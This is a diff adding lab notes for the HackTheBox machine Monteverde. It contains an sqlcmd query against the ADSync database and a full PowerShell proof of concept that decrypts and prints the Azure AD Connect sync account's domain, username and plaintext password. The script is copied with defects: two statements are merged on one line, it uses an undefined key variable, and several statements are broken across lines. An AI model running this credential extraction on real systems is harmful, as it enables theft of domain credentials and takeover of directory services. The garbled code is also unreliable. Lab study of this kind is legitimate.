@@ -61,3 +61,68 @@ https://github.com/dirkjanm/adconnectdump
 https://blog.xpnsec.com/azuread-connect-for-redteam/
 If i recall it correct we have also used another tool written by this fella. (i.e. ldapdomain dump)
 
+Let's try the tool
+![[Pasted image 20240505044351.png]]
+
+I don't know how to run the tool as it wants a file that we can decrypt using this tool.
+```
+/root/HackTheBox/Monterverde/adconnectdump/decrypt.py
+```
+
+
+```
+sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
+```
+![[Pasted image 20240505045617.png]]
+
+```
+instance_id: 1852B527-DD4F-4ECF-B541-EFCCBFF29E31
+keyset_id: 1
+entropy: 194EC2FC-F186-46CF-B44D-071EB61F49CD
+```
+
+Changes:
+```
+$keyset_id = 1
+$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
+$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
+```
+
+Now will save the script adconnect.ps1
+```
+Function Get-ADConnectPassword{
+Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
+$keyset_id = 1
+$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
+$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList
+"Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
+$client.Open()
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM
+mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName
+Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']"
+| select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']"
+| select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name =
+'Password'; Expression = {$_.node.InnerXML}}
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+}
+```
